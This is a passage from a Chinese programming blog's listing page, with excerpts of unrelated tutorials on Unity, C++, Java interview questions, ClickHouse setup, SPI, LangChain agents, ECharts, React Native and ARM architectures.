4.序列化属性和获取属性
private SerializedProperty type;
private SerializedProperty show;
// 抓取对应的序列化属性 这里的名字和你需要判断和显示的属性声明相同PS:不是类名
type = test.FindProperty(“text”);
show= test.FindProperty(“show”);
5.做显示隐藏
//检视面板 当面板内容发生变化时触发
public override void OnInspectorGUI()
{
// 从物体上抓取最新的信息
test.Update();
//显示type字段
EditorGUILayout.PropertyField(type);
// type.enumValueIndex 当前字段的内容
if(type.enumValueIndex == 1)
EditorGUILayout.PropertyField(show);
}
//应用属性更改
结束
代码块 using UnityEditor;
[CustomEditor(typeof(AniByNet))]
public class AniNetInspectorEditor : Editor
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6268b21e7c5c6e486dbac73b4d8f5c13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46c8407ae3305fa20e512304591d3fb4/" rel="bookmark">
			C&#43;&#43;获取时间戳 微秒级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		std::string formatTimeStamp(long long microTimestamp) { std::time_t seconds_since_epoch = static_cast&lt;time_t&gt;(microTimestamp / 1000000);//将时长转换为秒 #if defined _MSC_VER &amp;&amp; _MSC_VER &gt;= 1400 tm exact_time; localtime_s(&amp;exact_time, &amp;seconds_since_epoch); int tm_microsec = static_cast&lt;int&gt;(microTimestamp % 1000); int tm_millisec = static_cast&lt;int&gt;(microTimestamp / 1000 % 1000); #elif defined __GNUC__ tm exact_time; localtime_r(&amp;seconds_since_epoch, &amp;exact_time); int tm_microsec = static_cast&lt;int&gt;(microseconds_since_epoch % 1000); int tm_millisec = static_cast&lt;int&gt;(microseconds_since_epoch / 1000 % 1000); #else #error "Unknown compiler" #endif char temp[27]{ 0 }; snprintf(temp, 27, "%04d-%02d-%02d %02d:%02d:%02d.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46c8407ae3305fa20e512304591d3fb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1feb0e08c60b3897daf04c20de66c3d/" rel="bookmark">
			全网最全JAVA面试八股文，终于整理完了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 今天为大家整理了目前互联网出现率最高的大厂面试题，所谓八股文也就是指文章的八个部分，文体有固定格式:由破题、承题、起讲、入题、起股、中股、后股、束股八部分组成，题目一律出自四书五经中的原文。
而JAVA面试八股文也就是为了考验大家的JAVA基础功底，所以强烈建议背诵全文。
1、并发编程三要素？ （1） 原子性
原子性指的是一个或者多个操作，要么全部执行并且在执行的过程中不被其他操作打断，要 么就全部都不执行。
（2） 可见性
可见性指多个线程操作一个共享变量时，其中一个线程对变量进行修改后，其他线程可以立 即看到修改的结果。
（3） 有序性
有序性，即程序的执行顺序按照代码的先后顺序来执行。
2、实现可见性的方法有哪些？ synchronized 或者 Lock：保证同一个时刻只有一个线程获取锁执行代码，锁释放之前把最新的值刷新到主内存，实现可见性。
3、多线程的价值？ （1） 发挥多核 CPU 的优势
多线程，可以真正发挥出多核 CPU 的优势来，达到充分利用 CPU 的目的，采用多线程的方式去同时完成几件事情而不互相干扰。
（2） 防止阻塞
从程序运行效率的角度来看，单核 CPU 不但不会发挥出多线程的优势，反而会因为在单核CPU 上运行多线程导致线程上下文的切换，而降低程序整体的效率。但是单核 CPU 我们还是要应用多线程，就是为了防止阻塞。试想，如果单核 CPU 使用单线程，那么只要这个线程阻塞了，比方说远程读取某个数据吧，对端迟迟未返回又没有设置超时时间，那么你的整个程序在数据返回回来之前就停止运行了。多线程可以防止这个问题，多条线程同时运行， 哪怕一条线程的代码执行读取数据阻塞，也不会影响其它任务的执行。
（3） 便于建模
这是另外一个没有这么明显的优点了。假设有一个大的任务 A，单线程编程，那么就要考虑很多，建立整个程序模型比较麻烦。但是如果把这个大的任务 A 分解成几个小任务，任务 B、任务 C、任务 D，分别建立程序模型，并通过多线程分别运行这几个任务，那就简单很多了。
4、创建线程的有哪些方式？ （1） 继承 Thread 类创建线程类
（2） 通过 Runnable 接口创建线程类
（3） 通过 Callable 和 Future 创建线程
（4） 通过线程池创建
5、创建线程的三种方式的对比？ （1） 采用实现 Runnable、Callable 接口的方式创建多线程。优势是：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1feb0e08c60b3897daf04c20de66c3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a27f065eebbbe7d9959547bfe351ff4d/" rel="bookmark">
			java 实体动态添加属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import com.google.common.collect.Maps; import net.sf.cglib.beans.BeanGenerator; import net.sf.cglib.beans.BeanMap; import org.apache.commons.beanutils.PropertyUtilsBean; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import java.beans.PropertyDescriptor; import java.lang.reflect.InvocationTargetException; import java.util.HashMap; import java.util.Map; /** * 动态为bean添加字段 * @Author gongl * @Create 2022-01-11 */ public class DynamicBeanUtils { private static final Logger logger = LoggerFactory.getLogger(DynamicBeanUtils.class); public static Object getTarget(Object dest, Map&lt;String, Object&gt; addProperties) { PropertyUtilsBean propertyUtilsBean = new PropertyUtilsBean(); //得到原对象的属性 PropertyDescriptor[] descriptors = propertyUtilsBean.getPropertyDescriptors(dest); Map&lt;String, Class&lt;?&gt;&gt; propertyMap = Maps.newHashMap(); for (PropertyDescriptor d : descriptors) { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a27f065eebbbe7d9959547bfe351ff4d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35fdab3b81edbe9d44ad885c9912b56c/" rel="bookmark">
			clickhouse单机安装（需要安装包的私信我）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、rpm包下载地址（四个） 2、上传到Linux服务器，创建一个clickhouse文件夹 3、在安装文件所在文件夹执行以下命令（离线安装） rpm -ivh *.rpm
ClickHouse 默认安装到/var/lib/clickhouse文件夹下
4、启动服务 启动/关闭服务： 开启服务 systemctl start clickhouse-server 查看服务状态 systemctl status clickhouse-server 关闭服务 systemctl restart clickhouse-server 5、启动服务可能会出现报错 5.1、解决方案 执行此命令：systemctl daemon-reload
6、查看是否可以正常启动 7、删掉初始密码配置文件/etc/clickhouse-server/users.d/default-password.xml rm -f /etc/clickhouse-server/users.d/default-password.xml
8、连接clickhouse客户端测试 clickhouse-client -m
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0584d6f94df1d064868c082124d78a71/" rel="bookmark">
			SPI协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SPI是什么 SPI，是一种高速的，全双工，同步的通信总通信协议，由一个主设备，一个或多个从设备组成，具有四根信号线：SDI（数据输入），SDO（数据输出），SCK（时钟），CS（片选）。
MISO： 主设备输入/从设备输出引脚。该引脚在从模式下发送数据，在主模式下接收数据。
MOSI： 主设备输出/从设备输入引脚。该引脚在主模式下发送数据，在从模式下接收数据。
SCLK：串行时钟信号，由主设备产生。
CS/SS：从设备片选信号，由主设备控制。它的功能是用来作为“片选引脚”，也就是选择指定的从设备，让主设备可以单独地与特定从设备通讯，避免数据线上的冲突。
SPI的优缺点： 优点 支持全双工操作；四个管教实现数据传输及控制，操作简单；数据传输速率较高。 缺点 需要占用主机较多的口线（每个从机都需要一根片选线）；只支持单个主机。没有相应的流控和应当机制，数据的可靠性得不到保证 SPI的传输模式 SPI有四种传输模式，通过时钟信号的时钟极性(CPOL)和时钟脉冲(CPHA)来控制。CPOL和CPHA控制着两个设备间何时进行数据交换以及何时对接受的数据进行采样，以保证设备间的同步传输。
CPOL时钟极性，会直接影响SPI总线空闲时的时钟信号是高电平还是低电平。
CPOL = 1：表示空闲时是高电平 CPOL = 0：表示空闲时是低电平 由于数据传输往往是从跳变沿开始的，也就表示开始传输数据的时候，是下降沿还是上升沿。
如下图：
CPHL时钟相位：一个时钟周期会有2个跳变沿上升沿和下降沿，而相位，直接决定SPI总线从那个跳变沿开始采样数据。
CPHA = 0：表示从第一个跳变沿开始采样 CPHA = 1：表示从第二个跳变沿开始采样 如下图：
​
至于跳变沿究竟是上升沿还是下降沿，这取决于 CPOL。记住， CPHA 只决定是哪个跳变沿采样。
根据时钟极性CPOL和时钟相位的不同配置，SPI有则有四种传输模式，其时序如图：
​
模式0 (CPOL=0; CPHA=0)：CPOL = 0：空闲时是低电平，第1个跳变沿是上升沿，第2个跳变沿是下降沿 CPHA = 0：数据在第1个跳（上升沿）采样
模式1 (CPOL=0; CPHA=1)：CPOL = 0：空闲时是低电平，第1个跳变沿是上升沿，第2个跳变沿是下降沿 CPHA = 1：数据在第2个跳变沿（下降沿）采样
模式2 (CPOL=1; CPHA=0)：CPOL = 1：空闲时是高电平，第1个跳变沿是下降沿，第2个跳变沿是上升沿 CPHA = 0：数据在第1个跳变沿（下降沿）采样
模式3 (CPOL=1; CPHA=1)CPOL = 1：空闲时是高电平，第1个跳变沿是下降沿，第2个跳变沿是上升沿 CPHA = 1：数据在第2个跳变沿（上升沿）采样
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0584d6f94df1d064868c082124d78a71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8ed6757d8492d5e21bf04e041459df1/" rel="bookmark">
			数据结构 | 顺序表的基本实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习教材：《数据结构——从概念到C++实现》
分类专栏：数据结构与算法(C++)
文章目录
前言
正文
1 顺序表概述
1.1 线性表的逻辑结构
1.2 线性表的顺序存储结构
2 顺序表实现
前言 最近刚在学习《数据结构与算法》，单纯地跟课、看书觉得并不能很好的掌握好这些知识点，所以决定尝试将学习的知识点归纳总结，也将其进行代码实现，强化对知识点的理解。即作为笔记、实践，又作为我的思路分享。因为初学，难免有不正确、不恰当之处，敬请指正！
正文 1 顺序表概述 线性表（linear list）简称表，是 n（ n≥0）个数据元素的有限序列，跟据存储结构的不同可以分为顺序表和链表。
线性表的顺序存储结构为顺序表（sequential list），其基本思路使用一段地址连续的存储单元依次存储线性表的数据元素，具有随机存取（random access）结构。
2 顺序表实现 先定义出顺序表类，成员变量实现顺序表存储结构，成员函数实现线性表的基本操作。由于线性表的数据元素类型不确定，采用C++的模板机制，定义出模板类SeqList（本文类模板中的成员函数均使用类内声明、类外定义）。
// Sequential List const int MaxSize = 100; // 规定顺序表最多可以接受多少元素，可以跟据实际情况修改 template&lt;class DataType&gt; // 定义模板类SeqList class SeqList { public: // 建立空的顺序表 SeqList(); // 建立长度为length的顺序表 SeqList(DataType arr[],int length); // 析构函数 ~SeqList() {}; // 按位查找元素 DataType Get(int i); // 按值查找元素，返回元素序号 int Locate(DataType x); // 插入操作，在第i个位置插入值为x的元素 void Insert(int i, DataType x); // 删除操作，删除第i个元素 DataType Delect(int i); // 判断是否为空表 int Empty(); // 遍历操作，按序号依次输出各元素 void PrintList(); // 返回线性表长度 int Length(); private: DataType m_Arr[MaxSize]; int m_length; }; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8ed6757d8492d5e21bf04e041459df1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08fc8271723339fe182fe8c01bdb16df/" rel="bookmark">
			【LeetCode热题100】打卡第43天：会议室II&amp;完全平方数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 【LeetCode热题100】打卡第43天：会议室II&amp;完全平方数⛅前言 会议室II🔒题目🔑题解 完全平方数🔒题目🔑题解 【LeetCode热题100】打卡第43天：会议室II&amp;完全平方数 ⛅前言 大家好，我是知识汲取者，欢迎来到我的LeetCode热题100刷题专栏！
精选 100 道力扣（LeetCode）上最热门的题目，适合初识算法与数据结构的新手和想要在短时间内高效提升的人，熟练掌握这 100 道题，你就已经具备了在代码世界通行的基本能力。在此专栏中，我们将会涵盖各种类型的算法题目，包括但不限于数组、链表、树、字典树、图、排序、搜索、动态规划等等，并会提供详细的解题思路以及Java代码实现。如果你也想刷题，不断提升自己，就请加入我们吧！QQ群号：827302436。我们共同监督打卡，一起学习，一起进步。
PS：作者水平有限，如有错误或描述不当的地方，恳请及时告诉作者，作者将不胜感激
会议室II 🔒题目 原题链接：253.会议室II
🔑题解 解法一：优先队列
import java.util.PriorityQueue; /** * @author ghp * @title */ class Solution { public int minMeetingRooms(int[][] intervals) { if (intervals.length == 0) { return 0; } // 升序队列，队头到队尾的元素是从小到大排序的，存储活动的结束时间 PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;&gt;(intervals.length, (a, b) -&gt; a - b); // 往队列中添加第一场会议的结束时间 queue.offer(intervals[0][1]); // 遍历会议的起始时间 for (int i = 1; i &lt; intervals.length; i++) { // 判断当前会议开始时刻，之前开始的会议中是否存在已经结束的会议 if (intervals[i][0] &gt;= queue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08fc8271723339fe182fe8c01bdb16df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f71bb012464746b2d1306c097b03c9a/" rel="bookmark">
			AI大模型时代下运维开发探索第一篇：ReAct工程初探
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引子 人工智能大模型的出现，已渐渐地影响了我们的日常生活和工作方式。生活中无处不在的AI，使我们的生活变得更加智能和便捷。工作中，AI大模型的高效和精准，极大地提升了我们解决问题的效率。
是的，我们不能忽视AI大模型对运维开发的巨大影响和潜力。本系列文章旨在探索这一可能性，试图解答一个问题——AI大模型是否能够融入我们的运维开发中，为我们带来更大的便利和价值。我们期待通过这个探索，找到一个AI大模型与运维开发相融合的新方向，开启一种崭新的、更高效的运维开发方式。
真正的工具人 平时，“工具人"这个词，常常被用来进行一种幽默而略带自嘲的表达。我们都可能有过这样的经历，面对一堆琐碎而杂乱的任务，无奈地笑称自己为"工具人”。然而，为什么这个词会在这里被提出来？为了我们在后面编程过程中，对使用AI大模型有个形象的认知：它是一个具备操作工具能力的人工智能模型。
其实，你们可能已经猜到了，我要讲的正是AI大模型中的比较最常见的使用结构：Agent + Tool。
在各种新兴的框架驱动下（比如LangChain等），人工智能不再只是我们口中的“工具”，而是变身成为一个真正意义上的“工具人”。他们是真正会使用工具的行动者，而非工具本身。他们不仅能接受和执行我们的指令，更能够熟练运用各种工具去解决问题，创造价值。
“Agent"这个词在计算机科学中有着悠久的历史。在早期，它被用于形容一种代理或者媒介，承担着在网络世界与现实世界之间建立桥梁的重任。以浏览器的"User Agent"为例，它实际上是浏览器在与网络服务器进行交互时，声明自己身份的一种方式。而在这个过程中，浏览器可以被看作是用户（User）和互联网内容（Web content）之间的"Agent”。
随着人工智能技术的快速发展，"Agent"这个词的含义也在逐渐丰富和深化。在AI领域，"Agent"常常被用来形容那些可以自主进行决策，响应环境变化，并对各种指令进行执行的模型或系统。
了解完Agent + Tool 的背景之后，我们下面切入正题看看LangChain中的Agent和Tool是如何运作的。
LangChain 下的 Agent + Tool 实践 简单实践 下面贴一个最简单常见的例子：查看机器的运行时长。
import os from subprocess import Popen, PIPE from langchain.llms import OpenAI from langchain.tools import StructuredTool from langchain.agents import initialize_agent, AgentType def ssh(command:str, host: str, username: str = "root") -&gt; str: """A tool that can connect to a remote server and execute commands to retrieve returned content.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f71bb012464746b2d1306c097b03c9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f2a0e1f1eda367b42c6125c44a9a2fa/" rel="bookmark">
			echarts根据经纬度在地图上生成标点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.确保你已经引入了 ECharts 的库文件，可以通过 CDN 引入，也可以下载到本地后引入。在 HTML 文件中添加以下标签：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;ECharts 地图标点示例&lt;/title&gt; &lt;script src="https://cdn.jsdelivr.net/npm/echarts@5.2.2/dist/echarts.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="map" style="width: 800px; height: 600px;"&gt;&lt;/div&gt; &lt;script src="script.js"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 2.在 script.js 文件中，编写以下 JavaScript 代码：
// 初始化 ECharts 实例 var myChart = echarts.init(document.getElementById('map')); // 注册地图的 JSON 数据 echarts.registerMap('your_map_name', your_map_json); // 经纬度数据示例（这里使用随机数据作为示例） var data = [ { name: '地点A', value: [经度A, 纬度A] }, { name: '地点B', value: [经度B, 纬度B] }, // 添加更多的标点数据 // .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f2a0e1f1eda367b42c6125c44a9a2fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a26397f5deb3033097c3a7e394aef8f/" rel="bookmark">
			layui&#43;drogon完成文件上传（简例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		layui界面加入按钮、文本框、进度条：
&lt;div class="layui-row"&gt; &lt;button type="button" class="layui-btn" id="file_upload_control"&gt;文件上传&lt;/button&gt; &lt;input type="file" id="files_input" style="display: none" multiple&gt; &lt;/div&gt; &lt;div class="layui-input-inline" style="margin-top: 1%;"&gt; &lt;input disabled autocomplete="off" class="layui-input" id="file_chose" style="width: 198%;height: 30px; " type="text" maxlength="30" lay-verify="required" lay-vertype="tips" required=""&gt; &lt;/div&gt; &lt;div class="layui-row"&gt; &lt;div class="layui-progress layui-progress-big" lay-filter="demoprogress" lay-showPercent="yes" id="upload_progress" style="width: 43%;margin-top: 1%;"&gt; &lt;div class="layui-progress-bar layui-bg-green" lay-percent="0%"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; js控制事件响应：
layui.use(['upload','element'], function() { var upload = layui.upload; var element = layui.element; element.init(); var uploadInst = upload.render({ elem: '#file_upload_control' , url: '/api/v2/system/OTA/upload' , acceptMime : '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a26397f5deb3033097c3a7e394aef8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/452e6e7ef9e8305917d81086c9630f99/" rel="bookmark">
			react native 本地存储 AsyncStorage
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		An asynchronous, unencrypted, persistent, key-value storage system for React Native.
Async Storage 只能用来储存字符串数据，所以为了去储存object类型的数据，得先进行序列化（JSON.stringify()）当你想要使用数据的时候，就可以使用JSON.parse()
An asynchronous, unencrypted, persistent, key-value storage system for React Native.
Async Storage 只能用来储存字符串数据，所以为了去储存object类型的数据，得先进行序列化（JSON.stringify()）当你想要使用数据的时候，就可以使用JSON.parse()
import AsyncStorage from '@react-native-async-storage/async-storage' useEffect(() =&gt; { Api.h5.uploadGetTokenForH5().then(async (res) =&gt; { if (res.code === 200) { await AsyncStorage.setItem('qiniuUploadTokenForH5', res.data.token) const qiniuUploadTokenForH5 = await AsyncStorage.getItem('qiniuUploadTokenForH5') console.log('qiniuUploadTokenForH5', qiniuUploadTokenForH5) } }) }, []) 参考链接：
https://chat.xutongbao.top/
https://github.com/react-native-async-storage/async-storage#readme
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5d63a69142bb655827419fe231bf615/" rel="bookmark">
			【Grafana-常见问题】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.内网环境(无法连接百度等)报错:if you’re seeing this grafana has failed to load its application
解决:浏览器和Grafana版本不兼容
1、升级内网浏览器版本，全换高版本
2、降低grafana服务端版本，博主选择7.5.11
3、内网本地机器时间调整为当前时区东八区北京时间
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afed42662062cabadd21e16fd7a4562a/" rel="bookmark">
			【ARM Cortex-M 系列 3 番外篇 -- ARMv6, ARMv7, ARMv8, ARMv9 架构差异及精简指令集 与 复杂指令集 介绍】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 ARM 架构CISC 与 RISC 差异ARM 架构版本ARMv6 与 ARMv7 差异ARMv8 与 ARMv7 差异ARMv8 与 ARMv9 差异 上篇文章：ARM Cortex-M 系列 2.1 – RT-Thread Cortex-M7 异常处理及 hardfault 处理分析
ARM 架构 ARM架构是一种处理器架构，全称为高级精简指令集计算机（Advanced RISC Machine）。它是英国ARM公司设计的一种精简指令集（RISC）处理器架构，和复杂指令集（CISC）处理器架构相对。
CISC 与 RISC 差异 CISC（Complex Instruction Set Computer，复杂指令集计算机）和RISC（Reduced Instruction Set Computer，精简指令集计算机）是两种不同的CPU设计理念。它们的主要差异在于指令集的复杂性、执行效率和硬件设计。
指令集：CISC的指令集更复杂，包含大量的复杂和专门的指令，例如，一条指令可能就能完成数据的加载、运算和存储等多个操作。而RISC的指令集则更精简，每条指令只做一件事，如加载数据、运算或存储数据。
执行效率：CISC的每条指令执行时间不同，有的指令可能需要多个时钟周期来执行。而RISC的每条指令设计为在一个时钟周期内完成，这样可以简化硬件设计，提高指令的执行效率。
硬件设计：CISC的硬件设计相对复杂，因为需要硬件来处理复杂的指令。而RISC的硬件设计更简单，因为它的指令集更精简。这使得RISC的处理器更容易设计，也更容易实现并行处理，以提高性能。
应用场景：CISC在桌面电脑和服务器等需要执行复杂计算任务的场景中常见，例如Intel的x86架构。而RISC更多应用在移动设备和嵌入式系统中，这些场景下对功耗和体积有更高的要求，例如ARM架构。
Intel和ARM处理器的第一个区别是，前者使用复杂指令集（CISC)，而后者使用精简指令集（RISC）。属于这两种类中的各种架构之间最大的区别，在于它们的设计者考虑问题方式的不同。ARM从来只是设计低功耗处理器，Intel的强项是设计超高性能的台式机和服务器处理器。
ARM 架构版本 ARM架构的主要特点是高性能、低功耗和小体积，特别适用于移动通信、嵌入式系统和其他功耗敏感的应用。
ARM架构主要有以下几个版本：
ARMv1至ARMv3：这是最初的ARM架构，采用32位设计。ARMv4和ARMv5：在这两个版本中，ARM开始支持DSP指令和嵌入式实时操作系统。ARMv6：在这个版本中，ARM增加了SIMD指令。ARMv7：这是目前最广泛应用的ARM架构，它被分为三个系列：A系列用于高性能产品，R系列用于实时系统，M系列用于微控制器。ARMv8：这是ARM首次引入64位架构，它同时支持64位和32位应用。 ARM架构由于其高性能和低功耗的优点，广泛应用于各种电子设备中，包括智能手机、平板电脑、电视、路由器，以及汽车电子、工业自动化等领域。
ARMv6 与 ARMv7 差异 以下是它们的主要区别：
性能：ARMv7的性能一般比ARMv6更强。这是因为ARMv7引入了新的指令集，以及更强的浮点运算支持，可以提高处理器的计算性能。浮点运算：ARMv7引入了硬件浮点运算支持（VFPv3），而ARMv6则使用较旧的VFPv2浮点运算。硬件浮点运算可以极大提高处理器处理浮点数的能力。指令集：ARMv7引入了Thumb-2指令集，这是一种混合了32位和16位指令的新指令集，它既能像32位ARM指令那样提供高性能，又能像16位Thumb指令那样节省存储空间。而ARMv6则只支持原始的Thumb指令集。应用：ARMv7早期被广泛应用在高性能的嵌入式系统中，例如智能手机和平板电脑(现在以ARMv8为主，部分是ARMv9)。而ARMv6则多用于低端的嵌入式设备。 ARMv8 与 ARMv7 差异 以下是它们的主要区别：
位数：ARMv8 是 ARM 公司首次引入的 64 位架构，它同时支持 64 位和 32 位应用。而 ARMv7 主要是 32 位架构。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afed42662062cabadd21e16fd7a4562a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82dc6ae89e30b2a789feb791bee08ff6/" rel="bookmark">
			面试JAVA常被问到的问题（持续更新中）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 有的面试会被问到有没有写博客，这时候我尴尬，不知道怎么回答，所以这篇文章仅仅是把我面试JAVA的遇到的问题记录下来而已，也算是我写博客迈出的第一步，起码，以后被问到：有没有写博客？我可以回答，我写过。 （最主要的是以后换工作我不用频繁百度常见面试题了。。。。）
ps 1，别把我太当回事，我是个LJ；
2，说得不对的地方请多多包涵，想看更详细的请百度官方文档和其他大佬的文章；
3，如果有被问到了，我这上面没有的话，也可以提出来，我去学习，补上去，谢谢各位大哥。
正文 1，跟我讲讲SpringMVC的执行流程？ 浏览器提交http请求–&gt;提交到DispatcherServlet–&gt;根据配置文件找到请求对应的HandlerMapping–&gt;找到对应的Controller–&gt;Controller执行Service层业务代码–&gt;返回结果封装到ModelAndView–&gt;再次根据DispatcherServlet找到对应的视图解释器–&gt;数据封装到Model中–&gt;返回给JSP–&gt;http请求返回给浏览器
2，跟我讲讲Spring的IOC和AOP？ IOC简称：控制反转，又被叫做依赖注入（DI），其作用是把创建对象交由Spring工厂完成，避免了程序员创建对象的麻烦。
其实现大致分为以下四个步骤：
1，加载Spring容器BeanFactory创建Resource对象。
加载Spring的容器BeanFactory在其构造方法创建实现了Resource接口的对象的实例，Resource对象创建成功后会调用getConfiguration()方法获取到Spring配置文件的位置。
Resource的实现分为三种FileResource，UrlResource,ClassPathResource，分别对应获取文件，网络资源，项目路径下资源。
Resource创建如果有父类就使用父类的容器，如果没有就创建新的容器。
2，提取验证模式
BeanFactory会调用getInputStream()方法获取到配置文件的输入流，在加载前，会以DTD或XSD，通过头标签验证配置文件的正确性和完整性。
3，提取内容
把配置文件转换成一个document对象，这个document对象把类的内容转换成Spring的特殊结构BeanDefinition，BeanDefinition中包涵了Bean的所有信息，例如：是否懒加载，是否单例，是否抽象类，是否私有类等等。
4，注册
把所有的Bean装到ConcurrentHashMap中，以BeanName作为key，BeanDefinition作为Value。其中，如果BeanName重复，并且Spring不允许重复的话，那么就会报错，否则就会覆盖。
AOP简称：面向切面编程，其主要应用在业务贯穿了整个系统的时候，例如事务的控制，权限，安全，日志。
它的核心归纳为：切面，切点，目标对象，连接点，增强，引入，植入。
通知的方式又分为五种：前置通知，后置通知，环绕通知，异常通知，返回后通知。
加载的方式有两种：动态加载和cglib加载。
3，你用AOP做过什么业务？能简单讲讲吗？ 我利用AOP做过日志的管理，采用监听方法的调用去实现的。但是有缺点：每个人写的方法名不一样，有的时候监听不到方法的调用，所以我当时规定了起名规则，它的优点就是不需要去写自定义注解，可以少些代码，因为方法名的约束在所以提高代码后续的可读性。
第二种方法就是自定义注解去实现日志录入，优点就是灵活多变，缺点就是每个方法都要加这个注解。
4，能讲讲Mybatis的大概的执行流程吗？它是怎么与数据库完成数据的交互的？ mybatis会加载SqlSessionFactory容器，每次请求都会获取到一个SqlSession，由SqlSession建立起与数据库的会话，并把sql传入数据库执行，数据库执行后把结果返回，其中，也涉及到了mybatis一级缓存的调用（如果表的结构或数据没发生改变，并且SQL重复执行，那么查询的时候优先把一级缓存中的数据返回，而不是请求数据库查询SQL语句），每次查询的结果其实都会存到一级缓存中，mybatis默认开启了一级缓存，二级缓存则需要通过修改配置文件开启，二级缓存是针对Mapper的，主要是多个
SqlSession共享同一个Mapper。（这里我也把mybatic的一级缓存和二级缓存大概讲了一下）
5，数据库方面有了解吗？能讲讲NoSQL和MySql的区别吗？ 数据库方面也涉及到了CAP三大定律，即：一致性（C），可用性（A），分区容忍性（P）。
其中：传统型数据库，如MySql遵循的是CA，保证了一致性和可用性；KV结构的数据库满足AP，可用性与分区容忍性。
传统型数据库的优势在于：高性能，高拓展，高可用，能始终保证数据的一致性。缺点是当表数据量过大（五百万条或2.5G大小）的时候要考虑采用缓存，或者主从复制，读写分离，异构复制等数据库层次的优化操作。
NoSQL优势在于：体积小，速度快，成本低；缺点是很难保证数据的一致性，只能在业务层的代码做约束，但是根据墨菲定律，不管业务做得再严谨，一定会有脏数据产生，所以要用数据检查去补偿。其结构为Base模型（基本可用，软状态）。
6，能讲讲事务吗？ 事务的四大特性为：原子（事务的操作是原子性的），一致（数据前后保持一致），隔离（事务的操作互不影响），持久（一旦持久化则不可回滚）。
事务的隔离级别为：脏读，不可重复读，幻读。
数据库事务的又分为：Default（默认级别），uncommit，commit（解决脏读），read（解决不可重复读）,Serializable （解决幻读），事务的隔离级别设置得越高，数据库的性能就越低，所以一般只设置到commit级别。
7，能讲讲你建表的时候会注意哪一些吗？ 1、关于字段的类型
人类的岁数设置为tinyint，龟的岁数设置为smallint，行星的寿命设置为int，宇宙的寿命设置为bigint；
涉及到金钱的使用decimal，因为fload,double有精度的缺失；
尽量不适用text，除非字节数超过了5000，否则都是使用varchar；
2、关于字段名
判断的字段的起名为is_xxx；
3、关于索引
索引我也不会多建，过多的索引会对查询速度产生影响
4、关于设置默认值
推荐字段设置默认值，可以很好避免程序运行时的空指针异常
5、关于必有字段
创建时间，修改时间，修改人
8，能讲讲索引吗？你是怎么优化一条SQL的？ 索引常见的有主键索引、普通索引、唯一索引、全文索引、聚合索引。
聚合索引在使用的时候where后字段的顺序尽量与索引的顺序一致，否则可能会失效，并且聚合索引不能为null；
